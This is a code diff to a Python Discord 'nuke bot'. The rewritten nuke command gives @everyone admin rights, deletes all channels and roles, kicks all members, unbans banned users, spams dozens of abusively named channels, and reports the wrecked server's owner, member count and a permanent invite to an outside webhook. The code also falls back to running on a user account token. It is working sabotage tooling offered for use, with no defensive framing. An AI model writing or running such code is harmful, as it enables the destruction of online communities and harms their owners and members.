@@ -3,6 +3,12 @@ from discord.ext import commands
 import random
 from discord import Permissions
 import os
+import colorama
+from colorama import Fore, Style
+import asyncio
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+token = "Token HERE"
 
 CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
  
@@ -124,38 +130,65 @@ async def guildname(ctx, *, name):
   await ctx.message.delete()
   await ctx.guild.edit(name=name)
 
-@bot.command(pass_context=True)
-async def nuke(ctx, amount=500):
-        await ctx.message.delete()
-        guild = ctx.guild
-        for role in list(ctx.guild.roles):
-             if role.name == '@everyone':
-                  try:
-                      await role.edit(permissions=Permissions.all())
-                      print("@everyone has admin") 
-                  except:
-                      print("@everyone does NOT have admin")
-        for channel in list(ctx.guild.channels):
-            try:
-                await channel.delete()
-                print (f"{channel.name} has been deleted in {ctx.guild.name}")
-            except:
-                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
-        for role in list(ctx.guild.roles):
-            try:
-                await role.delete()
-                print (f"{role.name} has been deleted in {ctx.guild.name}")
-            except:
-                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
-        for user in list(ctx.guild.members):
-            try:         
-                await ctx.guild.kick(user)
-                print (f"{user.name} has been kicked from {ctx.guild.name}")
-            except:
-                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
-        for i in range(amount):
-           await guild.create_text_channel(random.choice(CHANNEL_NAMES))
-        print ('Action NUKE complete')
+webhooks = ["!!!WEBHOOKS HERE!!!"]
+@bot.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    try:
+      role = discord.utils.get(guild.roles, name = "@everyone")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.GREEN + f"@everyone has been given admin permissions in {guild.name}.")
+    except:
+      print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}.")
+    print(Style.RESET_ALL)
+    await asyncio.sleep(10)
+    print(f"Nuking server {guild.name}...")
+    for channel in guild.channels:
+      try:
+        await channel.delete()
+        print(Fore.GREEN + f"{channel.name} was successfully deleted.")
+      except:
+        print(Fore.RED + f"{channel.name} was not deleted.")
+    for member in guild.members:
+      try:
+        await member.kick()
+        print(Fore.GREEN + f"{member.name}#{member.discriminator} was kicked.")
+      except:
+        print(Fore.RED + f"{member.name}#{member.discriminator} was not kicked.")
+    for role in guild.roles:
+      try:
+        await role.delete()
+        print(Fore.GREEN + f"{role.name} was successfully deleted.")
+      except:
+        print(Fore.RED + f"{role.name} was not deleted.")
+    banned_users = await guild.bans()
+    for ban_entry in banned_users:
+      user = ban_entry.user
+      try:
+        await user.unban()
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} was successfully unbanned.")
+      except:
+        print(Fore.RED + f"{user.name}#{user.discriminator} was not unbanned.")
+    await guild.create_text_channel("get nuked.")
+    for channel in guild.text_channels:
+      if channel.position == 0:
+        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        webhook = DiscordWebhook(url=webhooks)
+        log = DiscordEmbed(title = f"Nuke Successful!", description = f"A nukebot just nuked the server **[{guild.name}]({link})**")
+        log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} ({bot.user.id})")
+        log.add_embed_field(name = "Server Owner", value = f"{guild.owner} ({guild.owner.id})", inline = False)
+        log.add_embed_field(name = "Member Count", value = f"{guild.member_count}", inline = False)
+        log.add_embed_field(name = "Invite Link", value = f"{link}")
+        webhook.add_embed(log)
+        webhook.execute()
+    print(Style.RESET_ALL)
+    print(f"Nuked {guild.name} successfully!\n{link}")
+    amount = 99
+    for i in range(amount):
+      await guild.create_text_channel(random.choice(CHANNEL_NAMES))
+      print("Nuked {guild.name} successfully")
+    return
 
 @bot.command(pass_context=True)
 async def ban(ctx):
@@ -317,4 +350,7 @@ async def voicec(ctx, amount=500):
     for i in range(amount):
         await guild.create_voice_channel(random.choice(CHANNEL_NAMES))
 
-bot.run("Bot Token Here")
+try:
+  bot.run(token)
+except:
+  bot.run(token, bot = False)
